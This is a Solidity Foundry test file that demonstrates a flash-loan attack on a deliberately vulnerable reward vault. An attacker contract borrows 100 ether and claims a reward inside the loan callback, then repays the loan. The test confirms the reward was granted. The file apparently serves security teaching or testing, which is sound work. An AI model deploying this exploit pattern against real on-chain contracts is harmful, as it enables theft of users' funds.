// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import "../src/FlashPool.sol";
import "../src/VulnerableVault.sol";

contract AttackerContract {
    FlashPool pool;
    VulnerableVault vault;

    constructor(address payable _pool, address _vault) {
        pool = FlashPool(_pool);
        vault = VulnerableVault(_vault);
    }

    receive() external payable {
        vault.claimReward();
        (bool success,) = payable(msg.sender).call{value: msg.value}("");
        require(success, "Transfer failed");
    }

    function attack() external {
        pool.flashLoan(100 ether, address(this), "");
    }
}

contract FlashAttackTest is Test {
    FlashPool pool;
    VulnerableVault vault;
    AttackerContract attacker;

    function setUp() public {
        pool = new FlashPool{value: 1000 ether}();
        vault = new VulnerableVault(payable(address(pool)));
        attacker = new AttackerContract(payable(address(pool)), address(vault));
    }

    function testFlashAttack() public {
        attacker.attack();
        assertEq(vault.rewards(address(attacker)), 1);
    }
}
